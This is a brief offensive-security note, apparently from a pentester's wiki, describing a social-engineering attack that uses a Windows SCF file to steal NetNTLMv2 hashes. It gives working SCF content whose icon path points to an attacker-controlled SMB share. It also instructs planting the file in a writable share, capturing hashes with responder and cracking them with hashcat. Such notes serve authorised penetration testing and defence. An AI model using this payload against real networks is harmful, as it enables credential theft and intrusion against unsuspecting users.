# SCF Files

## Social Engineering with an SCF File to Capture Someone's Hash

You can create a Windows Explorer command file (SCF file) that contains a link to an attacker-controlled SMB share. If a user clicks on the file, their computer will forward their NetNTLMv2 hash to the attacker-controlled SMB share. This hash can be cracked offline.

On the attacker-controlled machine, [[responder#Start Responding|start responding with responder]].

Create the SCF, something that looks like this:

```bash
$ cat tgihf.scf
[Shell]
Command=2
IconFile=\\$ATTACKER_FQDN_OR_IP\$ANY_SHARE_NAME\icon.ico
[Taskbar]
Command=ToggleDesktop
```

Write the SCF file to the writable SMB share folder and wait. If a user clicks on the file, their NetNTLMv2 hash will be captured by `responder`.

Use [[hashcat#Crack NetNTLMv2 Hashes|hashcat]] to crack the NetNTLMv2 hash.
